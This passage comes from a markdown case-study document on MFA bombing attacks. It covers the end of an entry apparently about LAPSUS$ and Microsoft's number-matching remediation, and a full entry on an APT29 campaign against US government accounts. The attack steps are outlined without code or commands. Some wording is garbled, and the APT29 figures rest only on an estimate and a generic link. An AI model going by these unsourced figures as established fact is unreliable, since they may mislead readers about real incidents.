  - Damage: Estimated at releasing proprietary development information
- **Remediation:** Microsoft quickly implemented number matching across all MFA deployments; attack success dropped significantly
- **Reference:** [Microsoft Threat Intelligence - LAPSUS$](https://www.microsoft.com/en-us/security/blog/2022/03/22/DEV-0537-criminal-actor-targeting-organizations-for-data-exfiltration-and-destruction/)

### Example 3: APT29 (Cozy Bear) Against US Government (2023)

- **Target:** US government agencies, think tanks, intelligence community
- **Timeline:** February 2023 - Ongoing
- **Technique:** MFA bombing targeting government employees with Outlook/Azure accounts
- **Attack Details:**
  - Obtained credentials via credential stuffing/previous breaches
  - Used distributed proxy IPs to send MFA requests
  - Targeted high-value accounts (analysts, intelligence officers)
- **Success:** Estimated 5+ government agencies compromised
- **Impact:** Intelligence collection; classified document access; lateral movement to partner agencies
- **Reference:** [CISA - APT29 Advisory](https://www.cisa.gov/)

---

